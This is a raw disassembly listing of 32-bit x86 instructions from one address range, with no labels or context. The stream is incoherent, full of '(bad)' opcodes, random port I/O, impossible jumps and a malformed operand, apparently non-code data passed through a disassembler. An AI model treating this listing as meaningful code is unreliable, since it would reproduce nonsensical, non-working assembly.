  41a3c9:	stos   BYTE PTR es:[edi],al
  41a3ca:	lods   al,BYTE PTR ds:[esi]
  41a3cb:	idiv   BYTE PTR [eax]
  41a3cd:	and    al,0x69
  41a3cf:	stos   BYTE PTR es:[edi],al
  41a3d0:	or     al,0xff
  41a3d2:	(bad)  
  41a3d3:	in     al,0xf8
  41a3d5:	in     al,0x8e
  41a3d7:	xor    edx,esp
  41a3d9:	clc    
  41a3da:	and    BYTE PTR [esi-0x6cb423c1],dh
  41a3e0:	and    al,0x66
  41a3e2:	daa    
  41a3e3:	gs aas 
  41a3e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a3e6:	std    
  41a3e7:	sbb    al,0xb8
  41a3e9:	jp     0x41a422
  41a3eb:	pop    eax
  41a3ec:	out    0x1,al
  41a3ee:	ja     0x41a3bd
  41a3f0:	mov    bl,0x4
  41a3f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a3f3:	dec    ebx
  41a3f4:	or     edi,DWORD PTR [ebp+0x38]
  41a3f7:	out    dx,al
  41a3f8:	sbb    BYTE PTR [esi-0x318eee1c],0x7a
  41a3ff:	pop    edi
  41a400:	dec    eax
  41a401:	mov    ch,0x6
  41a403:	mov    dh,0x65
  41a405:	in     al,0x46
  41a407:	cmp    BYTE PTR [ebx-0x5cbb81a3],al
  41a40d:	jle    0x41a3f4
  41a40f:	ret    0x9edc
  41a412:	mov    ss,WORD PTR [edx+0x1e]
  41a415:	jae    0x41a48e
  41a417:	pop    esi
  41a418:	cmp    BYTE PTR [esi],dl
  41a41a:	xchg   edi,eax
  41a41b:	xlat   BYTE PTR ds:[ebx]
  41a41c:	add    edi,DWORD PTR [esi]
  41a41e:	imul   edi,ecx,0xdac69d83
  41a424:	(bad)  
  41a425:	shl    BYTE PTR [edi-0x3a],cl
  41a428:	push   cs
  41a429:	in     al,0x9e
  41a42b:	xchg   BYTE PTR [ecx+0x2a],bl
  41a42e:	mov    eax,0xd3ae23e2
  41a433:	nop
  41a434:	xor    DWORD PTR ds:0xdf4fba80,ebx
  41a43a:	nop
  41a43b:	pop    ebp
  41a43c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a43d:	imul   ebx,DWORD PTR [eax+0x3ce46bc4],0xc1ae4e87
  41a447:	push   edx
  41a448:	adc    edx,DWORD PTR [ecx-0x4b]
  41a44b:	jecxz  0x41a469
  41a44d:	loop   0x41a416
  41a44f:	loope  0x41a440
  41a451:	xchg   esi,eax
  41a452:	cwde   
  41a453:	cwde   
  41a454:	fbld   TBYTE PTR [edi]
  41a456:	js     0x41a3fb
  41a458:	shr    dl,1
  41a45a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a45b:	xor    eax,0x815a0402
  41a460:	mov    ch,ch
  41a462:	add    DWORD PTR [esp+edx*8],esi
  41a465:	test   edx,esi
  41a467:	imul   edx,DWORD PTR [ecx-0xe],0x9968ff85
  41a46e:	push   ebx
  41a46f:	ret    0x44c6
  41a472:	and    al,BYTE PTR [ecx+0x159151a7]
  41a478:	aam    0x1d
  41a47a:	or     dh,BYTE PTR [ecx]
  41a47c:	inc    eax
  41a47d:	add    eax,0x7f78817c
  41a482:	je     0x41a41e
  41a484:	es push edx
  41a486:	std    
  41a487:	stos   BYTE PTR es:[edi],al
  41a488:	sbb    esi,DWORD PTR [edx+0x2c]
  41a48b:	nop
  41a48c:	xor    bh,ah
  41a48e:	adc    al,0x9a
  41a490:	adc    DWORD PTR [esi],edx
  41a492:	imul   ecx,DWORD PTR [edx],0x0
  41a495:	sbb    BYTE PTR [ecx],al
  41a497:	mov    cl,BYTE PTR [edi-0x66]
  41a49a:	push   edi
  41a49b:	xor    al,0x68
  41a49d:	lods   al,BYTE PTR ds:[esi]
  41a49e:	adc    eax,0xebb91e56
  41a4a3:	mov    ch,cl
  41a4a5:	leave  
  41a4a6:	xor    eax,0xfb56832f
  41a4ab:	cld    
  41a4ac:	inc    eax
  41a4ad:	inc    edi
  41a4ae:	jae    0x41a480
  41a4b0:	sbb    eax,0xa4330b18
  41a4b5:	pop    ebx
  41a4b6:	arpl   WORD PTR [esi+edi*8],sp
  41a4b9:	(bad)  
  41a4ba:	data16 jae 0x41a4b2
  41a4bd:	xchg   DWORD PTR [ebx-0x186191],esi
  41a4c3:	jno    0x41a4a1
  41a4c5:	dec    eax
  41a4c6:	(bad)  [esi]
  41a4c8:	cld    
  41a4c9:	pop    eax
  41a4ca:	xor    esp,0xed8f2c4e
  41a4d0:	pop    esi
  41a4d1:	inc    esp
  41a4d2:	inc    BYTE PTR [eax+edi*4-0xb28544c]
  41a4d9:	pop    ecx
  41a4da:	daa    
  41a4db:	push   edi
  41a4dc:	push   esp
  41a4dd:	int    0xb1
  41a4df:	push   eax
  41a4e0:	loop   0x41a53c
  41a4e2:	adc    BYTE PTR [ecx+eax*8+0x64544d8c],dh
  41a4e9:	xchg   BYTE PTR [ebx+edx*2+0x21f52b39],al
  41a4f0:	lea    ebx,[eax+0x77f25fc9]
  41a4f6:	or     al,0xa2
  41a4f8:	xchg   esi,eax
  41a4f9:	(bad)  
  41a4fb:	in     al,0x6c
  41a4fd:	xchg   esp,eax
  41a4fe:	jb     0x41a568
  41a500:	outs   dx,DWORD PTR ds:[esi]
  41a501:	lock cli 
  41a503:	xor    al,0xcb
  41a505:	in     eax,0x43
  41a507:	mov    al,gs:0x50fc2e90
  41a50d:	pusha  
  41a50e:	and    ah,BYTE PTR [eax+eax*1-0x532428b9]
  41a515:	leave  
  41a516:	je     0x41a58e
  41a518:	(bad)  
  41a519:	pop    edx
  41a51a:	jae    0x41a586
  41a51c:	pop    esp
  41a51d:	cmc    
  41a51e:	iret   
  41a51f:	les    eax,FWORD PTR ds:0xebd4
  41a524:	test   al,0x44
  41a526:	jecxz  0x41a4ed
  41a528:	es mov esp,esi
  41a52b:	push   edx
  41a52c:	push   ds
  41a52d:	jo     0x41a54d
  41a52f:	dec    eax
  41a530:	cmc    
  41a531:	out    0x5d,eax
  41a533:	(bad)  
  41a534:	and    BYTE PTR [esi],bl
  41a536:	xor    eax,0x9f780b36
  41a53b:	scas   eax,DWORD PTR es:[edi]
  41a53c:	or     eax,0xd6f5ef1f
  41a541:	cmp    esp,DWORD PTR ds:0xe04cc44f
  41a547:	int3   
  41a548:	adc    al,0x74
  41a54a:	addr16 inc ecx
  41a54c:	je     0x41a502
  41a54e:	push   cs
  41a54f:	mov    eax,ds:0x720f39c4
  41a554:	add    eax,0x4520e168
  41a559:	rcl    DWORD PTR [ebx-0x635ac4a],cl
  41a55f:	inc    ebx
  41a560:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a561:	ret    
  41a562:	mov    BYTE PTR [esi-0x5b3609ef],bl
  41a568:	in     al,0x71
  41a56a:	inc    edx
  41a56b:	test   BYTE PTR [edi],al
  41a56d:	mov    bh,0x70
  41a56f:	pop    esp
  41a570:	cdq    
  41a571:	pop    edx
  41a572:	jne    0x41a5ee
  41a574:	pop    ecx
  41a575:	retf   0x9df8
  41a578:	int    0x2e
  41a57a:	mov    bl,0xcf
  41a57c:	cmc    
  41a57d:	xchg   edx,eax
  41a57e:	mov    ch,0x38
  41a580:	jnp    0x41a51c
  41a582:	xor    DWORD PTR [ebx+0x584e9591],edx
  41a588:	add    al,0xfb
  41a58a:	and    eax,0x513fa36d
  41a58f:	shl    BYTE PTR [ecx],1
  41a591:	ret    0x54e
  41a594:	jmp    0x41a537
  41a596:	push   eax
  41a597:	dec    esp
  41a598:	sub    eax,0x46aab2df
  41a59d:	pop    edx
  41a59e:	xchg   ecx,edx
  41a5a0:	xchg   DWORD PTR [ebx+0x3a175669],edx
  41a5a6:	aad    0xd3
  41a5a8:	loop   0x41a582
  41a5aa:	jg     0x41a592
  41a5ac:	push   edx
  41a5ad:	cmp    cl,dl
  41a5af:	pop    esp
  41a5b0:	jnp    0x41a60b
  41a5b2:	dec    ecx
  41a5b3:	icebp  
  41a5b4:	and    bl,BYTE PTR [ebx]
  41a5b6:	xor    DWORD PTR [ebx-0x76620f56],ebx
  41a5bc:	sbb    eax,0xa385d25a
  41a5c1:	push   ebp
  41a5c2:	adc    ebx,DWORD PTR [edx]
  41a5c4:	xor    eax,ebx
  41a5c6:	cmp    ch,dh
  41a5c8:	out    0xac,al
  41a5ca:	(bad)  
  41a5cb:	mov    ecx,0x89fad0a2
  41a5d0:	in     eax,0xa4
  41a5d2:	mov    ebx,0xf37f05d6
  41a5d7:	sub    al,0x2b
  41a5d9:	mov    ch,0x9d
  41a5db:	cdq    
  41a5dc:	arpl   WORD PTR ds:0xdb86ca18,di
  41a5e2:	loopne 0x41a657
  41a5e4:	fwait
  41a5e5:	mov    eax,ds:0xcd4a8a4a
  41a5ea:	jnp    0x41a612
  41a5ec:	xchg   edi,eax
  41a5ed:	cld    
  41a5ee:	push   ds
  41a5ef:	dec    ebp
  41a5f0:	jns    0x41a628
  41a5f2:	out    dx,al
  41a5f3:	inc    ecx
  41a5f4:	add    eax,esp
  41a5f6:	add    eax,esi
  41a5f8:	and    ah,bh
  41a5fa:	mov    bh,0xb
  41a5fc:	ins    DWORD PTR es:[edi],dx
  41a5fd:	sbb    eax,0x37a51c19
  41a602:	cmp    al,BYTE PTR [ecx]
  41a604:	xchg   BYTE PTR ds:0x1c0a90df,cl
  41a60a:	fisub  WORD PTR [ebp-0x192a4ad3]
  41a611:	and    ah,BYTE PTR [edi+eiz*4]
  41a614:	mov    es,WORD PTR ds:0x5710638d
  41a61a:	dec    ebp
  41a61b:	xchg   ecx,eax
  41a61c:	loop   0x41a646
  41a61e:	push   edx
  41a61f:	pusha  
  41a620:	daa    
  41a621:	rcl    BYTE PTR ds:0xdb89ed1f,cl
  41a627:	test   eax,0x48402fc4
  41a62c:	leave  
  41a62d:	push   ebp
  41a62e:	push   ecx
  41a62f:	cmp    BYTE PTR cs:[edi+0x4d03d21f],0x74
  41a637:	and    DWORD PTR [esi-0x5143a061],esp
  41a63d:	ret    0x723
  41a640:	and    ebx,DWORD PTR [ebx]
  41a642:	int    0xe9
  41a644:	cmp    al,0x17
  41a646:	push   edx
  41a647:	pop    ecx
  41a648:	imul   esp,DWORD PTR [ebx-0x45],0x60a2c2ed
  41a64f:	mov    esp,0xf6d04d6
  41a654:	dec    ebx
  41a655:	or     cl,BYTE PTR [ebp+0x52]
  41a658:	test   BYTE PTR [edx+0x51],0x48
  41a65c:	clc    
  41a65d:	pusha  
  41a65e:	into   
  41a65f:	pop    ecx
  41a660:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a661:	inc    ebx
  41a662:	xor    BYTE PTR [ebx+0x46],bl
  41a665:	dec    edi
  41a666:	mov    ecx,0xf88ef91b
  41a66b:	xlat   BYTE PTR ds:[ebx]
  41a66c:	daa    
  41a66d:	add    eax,eax
  41a66f:	pop    ss
  41a670:	sub    BYTE PTR [edi+0x65],bh
  41a673:	mov    ecx,0xdcd204f6
  41a678:	push   eax
  41a679:	ss xchg ecx,eax
  41a67b:	push   es
  41a67c:	pop    eax
  41a67d:	cmp    eax,edi
  41a67f:	cdq    
  41a680:	cmp    al,0xa6
  41a682:	inc    ebx
  41a683:	sbb    BYTE PTR [edi+0x205c3f60],0x1f
  41a68a:	push   esi
  41a68b:	pop    esi
  41a68c:	fsub   QWORD PTR [ebp-0x776e3735]
  41a692:	pop    ebx
  41a693:	lods   al,BYTE PTR ds:[esi]
  41a694:	das    
  41a695:	shr    DWORD PTR [ecx],cl
  41a697:	scas   al,BYTE PTR es:[edi]
  41a698:	out    dx,eax
  41a699:	inc    eax
  41a69a:	xor    ch,BYTE PTR [ecx+0x508cbbbd]
  41a6a0:	mov    esp,0xb1acd5dc
  41a6a5:	(bad)  
  41a6a6:	fnsave [ebx]
  41a6a8:	jae    0x41a6bb
  41a6aa:	dec    ebp
  41a6ab:	jmp    0x41a719
  41a6ad:	sub    BYTE PTR [eax+edx*8],0xec
  41a6b1:	(bad)  
  41a6b2:	(bad)  
  41a6b3:	imul   esi,DWORD PTR [ebx+0x14],0xc227fe84
  41a6ba:	xchg   esp,eax
  41a6bb:	ins    DWORD PTR es:[edi],dx
  41a6bc:	sbb    ch,BYTE PTR [edi]
  41a6be:	in     eax,dx
  41a6bf:	cwde   
  41a6c0:	das    
  41a6c1:	xor    al,0x95
  41a6c3:	(bad)  
  41a6c4:	inc    eax
  41a6c5:	aaa    
  41a6c6:	jle    0x41a67b
  41a6c8:	popa   
  41a6c9:	xchg   ebp,eax
  41a6ca:	xchg   ebx,eax
  41a6cb:	lea    edx,[esi-0x27]
  41a6ce:	sahf   
  41a6cf:	jae    0x41a6ad
  41a6d1:	pop    esp
  41a6d2:	es push ss
  41a6d4:	mov    ch,0x3e
  41a6d6:	jmp    0x41a696
  41a6d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a6d9:	jno    0x41a6fa
  41a6db:	mov    al,ds:0x937a56a3
  41a6e0:	imul   esi,DWORD PTR ds:0x757a377,0x22401ba7
  41a6ea:	arpl   WORD PTR [edx],si
  41a6ec:	sub    bh,BYTE PTR [esi+0x64784986]
  41a6f2:	scas   al,BYTE PTR es:[edi]
  41a6f3:	sbb    DWORD PTR [edi-0x28b37ab9],ebp
  41a6f9:	xlat   BYTE PTR ds:[ebx]
  41a6fa:	push   edi
  41a6fb:	inc    edi
  41a6fc:	aad    0xf4
  41a6fe:	push   cs
  41a6ff:	cmp    al,ah
  41a701:	icebp  
  41a702:	jbe    0x41a71b
  41a704:	or     al,0xc2
  41a706:	add    eax,0x84630995
  41a70b:	cld    
  41a70c:	jns    0x41a6c6
  41a70e:	lea    esi,[esi]
  41a710:	lahf   
  41a711:	adc    eax,DWORD PTR [edi+0x27]
  41a714:	and    esi,DWORD PTR [edi]
  41a716:	inc    edx
  41a717:	or     esi,DWORD PTR [edx-0x2f65934b]
  41a71d:	push   eax
  41a71e:	(bad)  
  41a71f:	not    DWORD PTR [ecx-0x79758f44]
  41a725:	aaa    
  41a726:	inc    ecx
  41a727:	xor    DWORD PTR [ebx],esi
  41a729:	je     0x41a75f
  41a72b:	push   ebx
  41a72c:	adc    BYTE PTR [edi-0x59f6edb],cl
  41a732:	mov    ah,0xf6
  41a734:	jo     0x41a6e4
  41a736:	lods   eax,DWORD PTR ds:[esi]
  41a737:	stos   DWORD PTR es:[edi],eax
  41a738:	push   esp
  41a739:	ins    DWORD PTR es:[edi],dx
  41a73a:	retf   
  41a73b:	and    eax,0x15d8a58f
  41a740:	daa    
  41a741:	cmp    DWORD PTR [edx+eiz*4],ebx
  41a744:	daa    
  41a745:	or     DWORD PTR [edi+edx*4-0x75],esi
  41a749:	xchg   DWORD PTR [esp+esi*4-0x80],edx
  41a74d:	dec    esi
  41a74e:	pop    ds
  41a74f:	es (bad) 
  41a751:	mov    esi,0x5a197d2e
  41a756:	sub    esi,eax
  41a758:	fimul  DWORD PTR [ebp-0x77]
  41a75b:	fstp   TBYTE PTR ds:0xe5586c06
  41a761:	mov    al,ds:0xc7fbbbfc
  41a766:	fild   QWORD PTR [ecx+0x6d]
  41a769:	mov    ebp,0x922b7c50
  41a76e:	lods   al,BYTE PTR ds:[esi]
  41a76f:	jnp    0x41a7b0
  41a771:	mov    edi,0x6b89789e
  41a776:	add    ebp,DWORD PTR [esi+eiz*1-0xe]
  41a77a:	cmp    al,0xf
  41a77c:	test   DWORD PTR [ebx],0x975aaae4
  41a782:	call   edi
  41a784:	out    dx,eax
  41a785:	pop    esi
  41a786:	pop    ss
  41a787:	js     0x41a780
  41a789:	sbb    eax,DWORD PTR [esi+0x1]
  41a78c:	xchg   esi,eax
  41a78d:	xchg   ecx,eax
  41a78e:	dec    ebp
  41a78f:	jae    0x41a777
  41a791:	mov    ds:0xe32c3164,al
  41a796:	out    0x1,eax
  41a798:	sar    DWORD PTR ds:0xf2604507,cl
  41a79e:	ins    DWORD PTR es:[edi],dx
  41a79f:	sub    al,0x5b
  41a7a1:	mov    ah,0xa7
  41a7a3:	and    BYTE PTR [ebx+0x4f8514be],dl
  41a7a9:	scas   eax,DWORD PTR es:[edi]
  41a7aa:	add    BYTE PTR [edx],0x19
  41a7ad:	sub    esp,DWORD PTR [eax+0x19]
  41a7b0:	scas   al,BYTE PTR es:[edi]
  41a7b1:	fwait
  41a7b2:	arpl   si,dx
  41a7b4:	adc    BYTE PTR [esi+eiz*1],bl
  41a7b7:	inc    eax
  41a7b8:	fisub  DWORD PTR [edi+edx*8+0xd6b7dd9]
  41a7bf:	xor    esp,eax
  41a7c1:	dec    esi
  41a7c2:	add    ebx,DWORD PTR [esi+0x7dcac107]
  41a7c8:	and    ecx,0x55
  41a7cb:	les    edi,FWORD PTR [ecx]
  41a7cd:	lods   al,BYTE PTR ds:[esi]
  41a7ce:	pop    eax
  41a7cf:	jb     0x41a843
  41a7d1:	inc    ecx
  41a7d2:	es pop ds
  41a7d4:	mov    edx,0x12e12fd
  41a7d9:	es jno 0x41a782
  41a7dc:	cmp    DWORD PTR [edi*1+0x70e59a3],esi
  41a7e3:	inc    eax
  41a7e4:	dec    eax
  41a7e5:	out    dx,al
  41a7e6:	inc    esi
  41a7e7:	in     al,0x71
  41a7e9:	icebp  
  41a7ea:	mov    edx,0x2b19cde9
  41a7ef:	xor    BYTE PTR [esi],ch
  41a7f1:	cmp    eax,0x9e3827e9
  41a7f6:	mov    ch,0x51
  41a7f8:	shl    DWORD PTR [esi-0x6f],cl
  41a7fb:	and    DWORD PTR [edi-0x27],ebp
  41a7fe:	outs   dx,DWORD PTR ds:[esi]
  41a7ff:	adc    al,0x67
  41a801:	xor    DWORD PTR [ebp+0x62f76d3f],esp
  41a807:	mov    ecx,0x14c9fa5f
  41a80c:	stc    
  41a80d:	sbb    eax,0x7dd00c21
  41a812:	popa   
  41a813:	cmp    esp,DWORD PTR [ebp+0xf]
  41a816:	jb     0x41a7e3
  41a818:	dec    edx
  41a819:	cmp    edx,esp
  41a81b:	jp     0x41a87f
  41a81d:	dec    eax
  41a81e:	add    edx,DWORD PTR [edi+0x5e56cf29]
  41a824:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a825:	gs fs es sbb ecx,eax
  41a82a:	push   0x43f365f3
  41a82f:	js     0x41a7dc
  41a831:	jmp    edx
  41a833:	sub    DWORD PTR [edx-0x575ab35d],0x8fbdd5ea
  41a83d:	sbb    esi,DWORD PTR [ebx+0x7c57bd31]
  41a843:	sub    al,0x91
  41a845:	push   0xffffff95
  41a847:	xor    BYTE PTR [ebx-0x24],ah
  41a84a:	adc    ch,BYTE PTR [eax+0x5]
  41a84d:	jl     0x41a838
  41a84f:	and    al,0x75
  41a851:	cmp    DWORD PTR [ecx+0x277dfb1d],0xffffffd2
  41a858:	pop    ss
  41a859:	mov    edx,0xc8ecc5
  41a85e:	stc    
  41a85f:	iret   
  41a860:	xchg   DWORD PTR ds:0xf742e328,ecx
  41a867:	and    DWORD PTR [eax-0x7a],ecx
  41a86a:	ja     0x41a83b
  41a86c:	pop    ss
  41a86d:	inc    ebp
  41a86e:	mov    edi,0x64e94ce2
  41a873:	and    eax,0xb5a60e13
  41a878:	xchg   edx,eax
  41a879:	out    dx,al
  41a87a:	add    esp,eax
  41a87c:	out    0xa,eax
  41a87e:	jp     0x41a8e3
  41a880:	xchg   DWORD PTR ds:0xec636595,edi
  41a886:	sbb    esi,DWORD PTR [ebx+ebx*2+0x5ee5bd28]
  41a88d:	adc    DWORD PTR [eax+0x82ac8b8],edx
  41a893:	outs   dx,DWORD PTR ds:[esi]
  41a894:	test   DWORD PTR [ecx-0x546f0d6],edi
  41a89a:	xor    esp,DWORD PTR [esi]
  41a89c:	mov    al,BYTE PTR ds:0x8cdee8c9
  41a8a2:	xor    DWORD PTR [edx],eax
  41a8a4:	cmp    BYTE PTR [edi],bh
  41a8a6:	(bad)  
  41a8a7:	adc    dl,BYTE PTR [ebp-0x1a]
  41a8aa:	pop    ds
  41a8ab:	and    al,0x60
  41a8ad:	cmc    
  41a8ae:	and    DWORD PTR [ebx+ecx*8-0x13],ebx
  41a8b2:	(bad)  [eax-0x79]
  41a8b5:	(bad)  
  41a8b6:	sar    BYTE PTR [edi],cl
  41a8b8:	punpcklwd mm6,DWORD PTR [ebx]
  41a8bb:	xchg   esp,eax
  41a8bc:	rcr    dh,1
  41a8be:	xchg   esi,eax
  41a8bf:	test   DWORD PTR [edx],ecx
  41a8c1:	mov    bh,0xae
  41a8c3:	cmp    BYTE PTR [esi-0x6c],cl
  41a8c6:	sahf   
  41a8c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a8c8:	pushf  
  41a8c9:	add    al,0x85
  41a8cb:	push   0x39f634e4
  41a8d0:	int    0x90
  41a8d2:	jmp    DWORD PTR [edx-0x4f78961c]
  41a8d8:	jbe    0x41a8e9
  41a8da:	xchg   ecx,eax
  41a8db:	jmp    0xf2883c53
  41a8e0:	es sbb bh,cl
  41a8e3:	push   eax
  41a8e4:	out    0xa2,eax
  41a8e6:	(bad)  
  41a8e8:	lds    ecx,FWORD PTR [ebp+0x1c]
  41a8eb:	rcr    edi,cl
  41a8ed:	mov    al,ds:0x569f1f4
  41a8f2:	gs stc 
  41a8f4:	inc    eax
  41a8f5:	icebp  
  41a8f6:	fadd   DWORD PTR [esi+edi*8]
  41a8f9:	retf   0x716e
  41a8fc:	fdivr  st(5),st
  41a8fe:	mov    BYTE PTR [esi-0x6f],ch
  41a901:	shl    BYTE PTR [esi],0x6c
  41a904:	xchg   edx,eax
  41a905:	and    edx,0xc6e9b60e
  41a90b:	(bad)  
  41a90d:	cli    
  41a90e:	dec    ebp
  41a90f:	inc    ebx
  41a910:	or     al,0xf8
  41a912:	rcr    DWORD PTR [ebp-0x66f85272],1
  41a918:	xchg   edx,eax
  41a919:	shr    cl,1
  41a91b:	sub    DWORD PTR [ecx],esp
  41a91d:	scas   eax,DWORD PTR es:[edi]
  41a91e:	data16 sub dh,ah
  41a921:	rol    cl,1
  41a923:	cwde   
  41a924:	inc    ebx
  41a925:	adc    esp,esp
  41a927:	jge    0x41a930
  41a929:	leave  
  41a92a:	bound  ebp,QWORD PTR [edi+eax*4]
  41a92d:	iret   
  41a92e:	cmp    ebx,DWORD PTR [ebx]
  41a930:	inc    edi
  41a931:	and    dh,dh
  41a933:	adc    ebp,DWORD PTR [edx]
  41a935:	add    al,0x2
  41a937:	sar    BYTE PTR [ebx+0x7cb962bb],0xc9
  41a93e:	or     BYTE PTR [eax+0x67028129],dh
  41a944:	xor    al,al
  41a946:	pop    edi
  41a947:	adc    BYTE PTR [ebx+0x6ff50f9e],ch
  41a94d:	or     ah,BYTE PTR [edi]
  41a94f:	sub    DWORD PTR [eax+0x20],edx
  41a952:	dec    ecx
  41a953:	stos   DWORD PTR es:[edi],eax
  41a954:	outs   dx,BYTE PTR ds:[esi]
  41a955:	fiadd  WORD PTR [eax-0x59741e8c]
  41a95b:	gs das 
  41a95d:	lods   al,BYTE PTR fs:[esi]
  41a95f:	and    ch,BYTE PTR [edi+0x1ee47a0d]
  41a965:	leave  
  41a966:	jmp    0x22cb:0xd81bf480
  41a96d:	jne    0x41a9ac
  41a96f:	mov    cl,0x48
  41a971:	or     BYTE PTR [esi-0x66],ch
  41a974:	jbe    0x41a94b
  41a976:	mov    dh,0xd4
  41a978:	fcomp  QWORD PTR [esi]
  41a97a:	sbb    bh,BYTE PTR [ebp+0x3ace480c]
  41a980:	lock repz jp 0x41a969
  41a984:	push   edx
  41a985:	mov    al,ds:0xa61e023f
  41a98a:	lods   eax,DWORD PTR ds:[esi]
  41a98b:	push   ebx
  41a98c:	ror    DWORD PTR [edi+0x6c],1
  41a98f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a990:	int3   
  41a991:	push   ss
  41a992:	fld    DWORD PTR [ecx+0x5c73044]
  41a998:	fdivr  DWORD PTR [esi-0x1b]
  41a99b:	pop    ebx
  41a99c:	or     ecx,DWORD PTR [esi]
  41a99e:	and    al,0x11
  41a9a0:	pop    ecx
  41a9a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a9a2:	adc    al,0x5d
  41a9a4:	imul   DWORD PTR [eax+0x6fd4e364]
  41a9aa:	add    BYTE PTR [ecx-0x4a],0x7
  41a9ae:	test   DWORD PTR [ebx],eax
  41a9b0:	xor    ecx,DWORD PTR [esi+0x7150441b]
  41a9b6:	xchg   dh,al
  41a9b8:	dec    edx
  41a9b9:	mov    ss,WORD PTR [edx]
  41a9bb:	xchg   edi,eax
  41a9bc:	push   0x4d
  41a9be:	pop    edx
  41a9bf:	cmp    DWORD PTR [edi+ebp*4-0x11d14da8],esp
  41a9c6:	jno    0x41a9b3
  41a9c8:	clc    
  41a9c9:	add    DWORD PTR [eax-0x47],esi
  41a9cc:	pushf  
  41a9cd:	push   ss
  41a9ce:	(bad)  
  41a9cf:	daa    
  41a9d0:	sbb    edx,esp
  41a9d2:	shr    dl,1
  41a9d4:	sub    eax,0xade5fdc3
  41a9d9:	push   edx
  41a9da:	mov    ss,WORD PTR [eax-0x29]
  41a9dd:	push   ecx
  41a9de:	cmp    ebp,DWORD PTR [ebx-0x4d159c7d]
  41a9e4:	push   edi
  41a9e5:	push   0xca4f38cd
  41a9ea:	fdiv   DWORD PTR [ebx+0x7bf68b1f]
  41a9f0:	inc    ecx
  41a9f1:	in     eax,0x10
  41a9f3:	mov    WORD PTR [edx+0x6c],gs
  41a9f6:	or     bh,bl
  41a9f8:	cld    
  41a9f9:	cmp    ebx,esp
  41a9fb:	sub    esp,esi
  41a9fd:	push   esi
  41a9fe:	push   ebp
  41a9ff:	or     BYTE PTR [esi+ecx*8-0x778941ab],bl
  41aa06:	xor    ah,BYTE PTR [ecx]
  41aa08:	fcomip st,st(6)
  41aa0a:	test   eax,0xf4ca6aa8
  41aa0f:	xor    BYTE PTR [edi-0xffe4deb],dl
  41aa15:	mov    WORD PTR ds:0x43083882,fs
  41aa1b:	fist   WORD PTR [esi+0x3b]
  41aa1e:	xchg   edi,eax
  41aa1f:	jo     0x41aa63
  41aa21:	push   0x1163dbcb
  41aa26:	in     eax,dx
  41aa27:	in     al,0xef
  41aa29:	pop    edx
  41aa2b:	enter  0x5bef,0x97
  41aa2f:	retf   
  41aa30:	push   ss
  41aa31:	cmp    dl,BYTE PTR [eax+0x777daacf]
  41aa37:	add    eax,0x1ea11406
  41aa3c:	cli    
  41aa3d:	ret    
  41aa3e:	jl     0x41aa29
  41aa40:	dec    eax
  41aa41:	cmp    edi,edi
  41aa43:	not    BYTE PTR [edx-0x7b]
  41aa46:	or     al,0x80
  41aa48:	iret   
  41aa49:	fiadd  DWORD PTR [esi+ebx*4+0x1c5e9466]
  41aa50:	(bad)  
  41aa51:	jo     0x41aa38
  41aa53:	in     al,dx
  41aa54:	jb     0x41a9f2
  41aa56:	xchg   BYTE PTR [edi-0x12],ah
  41aa59:	pop    ds
  41aa5a:	and    eax,0x3f2af2ac
  41aa5f:	out    0xfa,eax
  41aa61:	mov    bl,0x6f
  41aa63:	in     al,dx
  41aa64:	push   ds
  41aa65:	lock call 0x6271:0xe8006310
  41aa6d:	stos   BYTE PTR es:[edi],al
  41aa6e:	lods   al,BYTE PTR ds:[esi]
  41aa6f:	aam    0x93
  41aa71:	(bad)
  41aa74:	adc    BYTE PTR [edi+0x47a3b214],al
  41aa7a:	xchg   BYTE PTR ds:0xd2cda877,bl
  41aa80:	xor    bh,ah
  41aa82:	leave  
  41aa83:	sub    eax,0x3fbd930e
  41aa88:	mov    cl,0xd
  41aa8a:	and    BYTE PTR [eax],bl
  41aa8c:	mov    ebp,0x900ff97c
  41aa91:	in     al,0x38
  41aa93:	mov    edi,0x51e9a26f
  41aa98:	cs mov edx,0x96935172
  41aa9e:	cwde   
  41aa9f:	inc    edi
  41aaa0:	imul   ecx,DWORD PTR [edi+0x58],0xffffff91
  41aaa4:	clc    
  41aaa5:	fadd   DWORD PTR [edi-0x5adfc82c]
  41aaab:	cmp    DWORD PTR [ebp-0x19],esp
  41aaae:	sub    ah,BYTE PTR [esi]
  41aab0:	adc    ch,0xf9
  41aab3:	or     DWORD PTR [edi+0x5dab1a7b],ebp
  41aab9:	sbb    BYTE PTR [esi],cl
  41aabb:	popa   
  41aabc:	add    DWORD PTR [ecx-0x4e66844],edi
  41aac2:	outs   dx,BYTE PTR ds:[esi]
  41aac3:	or     esp,0x1978eb6f
  41aac9:	stc    
  41aaca:	xor    al,0x2
  41aacc:	xchg   esp,eax
  41aacd:	push   eax
  41aace:	mov    ?,ebx
  41aad0:	pushf  
  41aad1:	or     eax,0x7a1592eb
  41aad6:	std    
  41aad7:	test   BYTE PTR [esi-0x1b],ah
  41aada:	add    bl,BYTE PTR [ebp-0x2fe6864d]
  41aae0:	sbb    BYTE PTR [eax],bh
  41aae2:	(bad)  
  41aae3:	scas   eax,DWORD PTR es:[edi]
  41aae4:	loope  0x41aaf9
  41aae6:	cmp    al,0x52
  41aae8:	adc    eax,0x57151538
  41aaed:	add    eax,0x72d670a8
  41aaf2:	sahf   
  41aaf3:	es ret 0x57b2
  41aaf7:	es pop edx
  41aaf9:	xchg   ebx,eax
  41aafa:	popf   
  41aafb:	xchg   esi,eax
  41aafc:	or     dh,cl
  41aafe:	pop    edx
  41aaff:	lock sahf 
  41ab01:	popa   
  41ab02:	call   0x30ff9ecb
  41ab07:	xor    al,0x99
  41ab09:	cmp    ch,BYTE PTR [edx-0x148266fe]
  41ab0f:	aas    
  41ab10:	pop    ss
  41ab11:	xchg   edi,eax
  41ab12:	mov    bl,0x22
  41ab14:	ss out 0x14,al
  41ab17:	sub    al,0xf7
  41ab19:	iret   
